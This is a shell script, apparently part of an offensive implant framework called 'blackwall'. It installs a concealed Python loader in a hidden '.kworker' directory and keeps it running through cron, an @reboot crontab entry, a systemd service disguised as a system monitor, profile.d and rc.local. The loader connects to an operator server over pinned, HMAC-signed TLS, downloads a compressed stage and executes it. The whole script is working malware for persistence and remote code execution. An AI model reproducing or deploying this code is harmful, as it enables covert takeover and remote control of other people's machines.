#!/bin/sh
# DESC: install a tiny HTTPS loader in cron/systemd/rc.local/profile.d
# REQ: root, python3
# SECRET: 1

P="${BW_PREFIX:-blk_}"
D="${BW_PREFIX_DIR:-/usr/local/sbin/.kworker}"
L="$D/${P}s0.py"
C="$D/${P}s0.json"
DRY="${BW_DRY_RUN:-0}"
PY="$(command -v python3 2>/dev/null || echo /usr/bin/python3)"
UNIT="sysmon-agent"

say() { printf '[PERSIST] %s\n' "$1"; }
run() {
    if [ "$DRY" = "1" ]; then
        printf '[dry] %s\n' "$*"
    else
        "$@"
    fi
}

if [ "${BW_PERSIST_REMOVE:-0}" = "1" ]; then
    say "removing loader and scheduled arms"
    for f in /etc/cron.d/${P}om /etc/systemd/system/${UNIT}.service /etc/systemd/system/${UNIT}.timer /etc/profile.d/${P}om.sh; do
        [ -e "$f" ] && run rm -f "$f"
    done
    for f in /etc/crontab /var/spool/cron/crontabs/root; do
        [ -f "$f" ] || continue
        if grep -qF "$L" "$f" 2>/dev/null; then
            tmp="$(mktemp)"
            grep -vF "$L" "$f" > "$tmp" 2>/dev/null
            run cp -f "$tmp" "$f"
            rm -f "$tmp"
        fi
    done
    command -v systemctl >/dev/null 2>&1 && run systemctl disable --now "${UNIT}.service" >/dev/null 2>&1
    run rm -rf "$D"
    say "removed"
    exit 0
fi

if [ -z "$BW_SERVER" ] || [ -z "$BW_SECRET_B64" ] || [ -z "$BW_CA_PEM_B64" ]; then
    say "missing BW_SERVER / BW_SECRET_B64 / BW_CA_PEM_B64"
    exit 1
fi

if ! command -v python3 >/dev/null 2>&1; then
    say "python3 is required for the loader"
    exit 1
fi

say "installing loader at $L"
run mkdir -p "$D"
run chmod 700 "$D"

# The loader holds no stage-0 code: it fetches the signed stage over pinned TLS
# on every boot.  That keeps the dropped persistence artefact small.
cat > "$C" << 'EOF_CFG'
EOF_CFG
python3 - "$C" << 'PY_CFG'
import json
import os
import sys

doc = {
    "url": os.environ.get("BW_SERVER", ""),
    "secret": os.environ.get("BW_SECRET_B64", ""),
    "ca_b64": os.environ.get("BW_CA_PEM_B64", ""),
    "fingerprint": os.environ.get("BW_FINGERPRINT", ""),
    "client_cert_b64": "",
    "client_key_b64": "",
}
# mTLS material is optional; stage-0 passes it through its config.
for env_name, key in (("BW_CLIENT_CERT_B64", "client_cert_b64"), ("BW_CLIENT_KEY_B64", "client_key_b64")):
    value = os.environ.get(env_name, "")
    if value:
        doc[key] = value
with open(sys.argv[1], "w", encoding="utf-8") as fh:
    json.dump(doc, fh, separators=(",", ":"))
    fh.write("\n")
PY_CFG
run chmod 600 "$C" 2>/dev/null || true

cat > "$L" << 'EOF_LOADER'
#!/usr/bin/env python3
# blackwall persistent stage fetcher (no modules embedded)
import base64
import hashlib
import hmac
import http.client
import json
import os
import ssl
import sys
import tempfile
import time
import urllib.parse
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))
CFG_NAME = os.path.basename(__file__)[:-3] + ".json"
CFG = json.load(open(os.path.join(HERE, CFG_NAME), "r", encoding="utf-8"))
SECRET = base64.b64decode(CFG["secret"])
API = "/api/v1"

try:
    import fcntl

    LOCK = open("/dev/shm/blk_s0.lock", "w")
    fcntl.flock(LOCK, fcntl.LOCK_EX | fcntl.LOCK_NB)
except OSError:
    sys.exit(0)


def fetch(path):
    parsed = urllib.parse.urlsplit(CFG["url"])
    host = parsed.hostname
    port = parsed.port or 443
    prefix = parsed.path.rstrip("/")
    full = prefix + path
    ts = str(int(time.time()))
    nonce = os.urandom(16).hex()
    body = b""
    msg = b"\n".join((b"GET", full.encode(), ts.encode(), nonce.encode(),
                      hashlib.sha256(body).hexdigest().encode()))
    sig = hmac.new(SECRET, msg, hashlib.sha256).hexdigest()
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_REQUIRED
    try:
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    except AttributeError:
        pass
    ctx.load_verify_locations(cadata=base64.b64decode(CFG["ca_b64"]).decode("utf-8"))
    tmp = []
    if CFG.get("client_cert_b64") and CFG.get("client_key_b64"):
        shm = "/dev/shm" if os.path.isdir("/dev/shm") else None
        for value in (CFG["client_cert_b64"], CFG["client_key_b64"]):
            fd, path = tempfile.mkstemp(prefix=".blk", dir=shm)
            os.write(fd, base64.b64decode(value))
            os.close(fd)
            os.chmod(path, 0o600)
            tmp.append(path)
        try:
            ctx.load_cert_chain(tmp[0], tmp[1])
        finally:
            for path in tmp:
                try:
                    os.unlink(path)
                except OSError:
                    pass
    conn = http.client.HTTPSConnection(host, port, context=ctx, timeout=20)
    try:
        conn.connect()
        der = conn.sock.getpeercert(binary_form=True)
        if hashlib.sha256(der or b"").hexdigest().upper() != CFG["fingerprint"].upper():
            os._exit(3)
        conn.request("GET", full, headers={
            "X-BW-Ts": ts,
            "X-BW-Nonce": nonce,
            "X-BW-Sig": sig,
            "X-BW-Proto": "1",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) BW/1.0",
            "Connection": "close",
        })
        resp = conn.getresponse()
        data = resp.read()
    finally:
        conn.close()
    if resp.status >= 400:
        raise SystemExit("stage fetch failed: HTTP %s" % resp.status)
    return data


def main():
    src = zlib.decompress(fetch(API + "/stage"))
    scope = {"__name__": "__main__", "__file__": None, "__package__": None,
             "__builtins__": __builtins__}
    exec(compile(src, "<stage0>", "exec"), scope)


if __name__ == "__main__":
    main()
EOF_LOADER
run chmod 700 "$L" 2>/dev/null || true

if [ -d /etc/cron.d ]; then
    printf '*/2 * * * * root %s %s >/dev/null 2>&1\n' "$PY" "$L" > /tmp/.${P}cron.$$
    run cp -f /tmp/.${P}cron.$$ /etc/cron.d/${P}om
    run chmod 644 /etc/cron.d/${P}om
    rm -f /tmp/.${P}cron.$$
    say "cron: /etc/cron.d/${P}om every 2m"
fi

if [ -f /etc/crontab ] && ! grep -qF "$L" /etc/crontab 2>/dev/null; then
    if [ "$DRY" = "1" ]; then
        printf '[dry] append @reboot %s %s to /etc/crontab\n' "$PY" "$L"
    else
        printf '@reboot root %s %s >/dev/null 2>&1\n' "$PY" "$L" >> /etc/crontab
    fi
    say "crontab: @reboot arm"
fi

if [ -d /etc/systemd/system ]; then
    if [ "$DRY" = "1" ]; then
        printf '[dry] write /etc/systemd/system/%s.service and enable it\n' "$UNIT"
    else
        cat > "/etc/systemd/system/${UNIT}.service" << EOF_UNIT
[Unit]
Description=Periodic system monitor worker
After=network.target

[Service]
Type=simple
ExecStart=${PY} ${L}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF_UNIT
        chmod 644 "/etc/systemd/system/${UNIT}.service"
        systemctl daemon-reload >/dev/null 2>&1
        systemctl enable "${UNIT}.service" >/dev/null 2>&1
        systemctl restart "${UNIT}.service" >/dev/null 2>&1
    fi
    say "systemd: ${UNIT}.service enabled"
fi

if [ -d /etc/profile.d ]; then
    if [ "$DRY" = "1" ]; then
        printf '[dry] write /etc/profile.d/%som.sh\n' "$P"
    else
        cat > "/etc/profile.d/${P}om.sh" << EOF_PROFILE
# system monitor helper
case "\$(id -u)" in 0) (${PY} ${L} >/dev/null 2>&1 &) ;; esac
EOF_PROFILE
        chmod 644 "/etc/profile.d/${P}om.sh"
    fi
    say "profile.d: root login re-arms the loader"
fi

if [ -f /etc/rc.local ] && [ -x /etc/rc.local ] && ! grep -qF "$L" /etc/rc.local 2>/dev/null; then
    if [ "$DRY" = "0" ]; then
        printf '%s %s >/dev/null 2>&1 &\n' "$PY" "$L" >> /etc/rc.local
    fi
    say "rc.local: arm appended"
fi

say "done; loader will fetch stage-0 over pinned TLS"
